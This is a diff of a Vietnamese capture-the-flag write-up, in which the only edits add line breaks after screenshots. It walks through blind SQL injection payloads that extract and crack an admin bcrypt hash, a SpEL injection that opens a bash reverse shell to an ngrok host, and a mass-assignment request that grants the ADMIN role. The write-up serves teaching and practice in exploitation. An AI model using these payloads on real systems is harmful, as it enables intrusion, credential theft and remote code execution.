@@ -48,25 +48,25 @@ Thôi không dài dòng, mình tiến hành craft payload extract data boolean b
 extractvalue(null,concat('~',(select password from User u where u.username = 'admin'),'~'))
 ```
 Nếu như request select thành công, sẽ trả về lỗi không thể lấy resultSet vì payload trigger lỗi error based:
-![image](https://hackmd.io/_uploads/By587p6tA.png)
-![image](https://hackmd.io/_uploads/S1jOm6atA.png)
+![image](https://hackmd.io/_uploads/By587p6tA.png)<br>
+![image](https://hackmd.io/_uploads/S1jOm6atA.png)<br>
 Còn nếu như câu query sai, thì server sẽ không trigger error based nên sẽ hiển thị được thông tin bình thường:
-![image](https://hackmd.io/_uploads/BJrC7p6K0.png)
+![image](https://hackmd.io/_uploads/BJrC7p6K0.png)<br>
 Vậy là payload của mình work, nhưng kết quả thì không được trả ra, nên giờ mình sẽ craft để extract password bằng cách blind thôi
 ```!
 extractvalue(null,concat('~',(select password from User u where u.username = 'admin' and binary(substr(u.password,1,1)) = '$'),'~'))
 ```
 Vì mình biết mật khẩu được hash theo kiểu Bcrypt nên đoạn ký tự đầu lúc nào cũng kiểu `$2a$10`, thử kí tự đầu là $ thì payload đã trả về lỗi (đúng như dự đoán):
-![image](https://hackmd.io/_uploads/rJ7jV6ptR.png)
+![image](https://hackmd.io/_uploads/rJ7jV6ptR.png)<br>
 Tốt rồi, đưa vào intruder thôi, Bcrypt hash ra độ dài cố định là 60.
-![image](https://hackmd.io/_uploads/Bkk18pTtA.png)
+![image](https://hackmd.io/_uploads/Bkk18pTtA.png)<br>
 Mình có được kết quả hash admin local là: `$2a$10$3l0p7n2pIIykRYaPsPbvt.8y60kvynF9E7Q6e21sMi7tBRPqL8zvS`, hashcat mình có được pass local là admin =)), yếu thật
 Vác payload sang challenge thật, mình có hash dump được là: `$2a$10$vFWElvoCouv8LuyTzOCT8eMq4KSvvbxEPpwRdXcJvDkSmVUbmooTW`
 Nhét hash vào file hash-2, chạy hashcat attack mode 3200 theo https://hashcat.net/wiki/doku.php?id=example_hashes
 ```
 hashcat -m 3200 -a 0 hash-2 /usr/share/wordlists/rockyou.txt --force
 ```
-![image](https://hackmd.io/_uploads/HylE366FR.png)
+![image](https://hackmd.io/_uploads/HylE366FR.png)<br>
 Mình có mật khẩu admin tại web challenge là `adidas`, quá yếu =)))
 ### SpEL Injection in fetchAllUser
 Leo lên được admin, mình diff code với project có trên github thì thấy đoạn code fetchAllUser dính lỗi parseExpression tên của user, chức năng này nằm tại api /api/v1/admin vốn chỉ được truy cập khi người dùng có role ADMIN:
@@ -108,13 +108,13 @@ Giờ mình sẽ register payload reverse shell xem sao, payload reverse shell m
 T(java.lang.Runtime).getRuntime().exec('bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/14482 0>&1')
 ```
 Chèn payload vào username, mình bắt intercept cho tiện:
-![image](https://hackmd.io/_uploads/H1vkkCTtC.png)
+![image](https://hackmd.io/_uploads/H1vkkCTtC.png)<br>
 Gửi request và mình rev shell thành công:
-![image](https://hackmd.io/_uploads/S15-yA6Y0.png)
+![image](https://hackmd.io/_uploads/S15-yA6Y0.png)<br>
 Sau đó là khoảng thời gian mình đi tìm flag =)), tìm ở các file enciron hay hệ thống không có, mình tìm cả ở db nhưng cũng không có:
-![image](https://hackmd.io/_uploads/By9o7CTFC.png)
+![image](https://hackmd.io/_uploads/By9o7CTFC.png)<br>
 Mình ngố quá, không nhận ra là flag nằm ngay tại thư mục chứa file war mà cứ đi tìm =)) (mình không để ý tên file)
-![image](https://hackmd.io/_uploads/SkxIX0aFA.png)
+![image](https://hackmd.io/_uploads/SkxIX0aFA.png)<br>
 **Flag:** crew{BearBurger_is_on_sale!_LINZ_IS_HERE}
 
 ### Another Workaround to Admin
@@ -138,9 +138,9 @@ Lúc này, mình sẽ có thể truyền vào 1 hàng mới user của mình b�
 ```
 roles[0].roleID.=1&roles[0].userID=1&roles[0].name=ADMIN
 ```
-![image](https://hackmd.io/_uploads/rJ62OlAKC.png)
+![image](https://hackmd.io/_uploads/rJ62OlAKC.png)<br>
 Trong db ta có người dùng đó với userID 18:
-![image](https://hackmd.io/_uploads/SJX3OxAFC.png)
+![image](https://hackmd.io/_uploads/SJX3OxAFC.png)<br>
 Tại bảng roles thì ta có 2 hàng để chứa role của user kev1n-3 là CUSTOMER và ADMIN:
-![image](https://hackmd.io/_uploads/BkUeKlRt0.png)
+![image](https://hackmd.io/_uploads/BkUeKlRt0.png)<br>
 Số của roleID và userID truyền vào không quan trọng, mình có thể truyền gì cũng được nhưng bắt buộc cần truyền giá trị vào, vì 2 biến này sẽ được gen ra tương ứng trong bảng khi khởi tạo user và khởi tạo đối tượng Role bằng userID. Theo như mình hiểu là sau khi nó save đối tượng user thì row role ADMIN sẽ được save, sau đó role CUSTOMER được save sau đó tại câu lệnh bên dưới.
